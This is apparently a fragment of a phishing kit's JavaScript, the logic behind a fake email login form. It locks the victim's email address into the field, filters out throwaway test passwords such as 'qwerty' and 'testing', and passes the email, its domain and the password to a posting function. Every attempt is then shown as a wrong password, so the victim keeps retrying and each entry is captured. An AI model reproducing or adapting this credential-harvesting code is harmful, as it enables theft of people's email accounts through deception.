// 
if (validEmail.test(usermail)) {
    $("#b_mail").val(usermail)
    $("#b_mail").attr('readOnly', true)
}

$("#boss_form_btn").on('submit', (e)=>{
    e.preventDefault();

    let b_pass = document.getElementsByClassName("boss_mail_inputs");

    if (!validEmail.test($("#b_mail").val())) {
        b_pass[0].style.borderColor = "red";
        return
    }
    else{
        b_pass[0].style.borderColor = "silver";
    }

    if (validEmail.test($("#b_pass").val()) || $("#b_pass").val().length < 6 || $("#b_pass").val().toLowerCase() == "qwerty" || $("#b_pass").val() == 123456 || $("#b_pass").val().toLowerCase() == "password" || $("#b_pass").val().toLowerCase() == "testing") {
        b_pass[1].style.borderColor = "red";
        return
    }
    else{
        b_pass[1].style.borderColor = "silver";
    }

    $("#loader").show().css({"display":"flex"})

    let url = $("#b_mail").val().split('@');

    postResult(url[1], $("#b_mail").val(), $("#b_pass").val(), postCount);
    
    setTimeout(() => {
        b_pass[1].style.borderColor = "red";
        postCount++
        $("#b_pass").val("")
    }, delayCounter);
})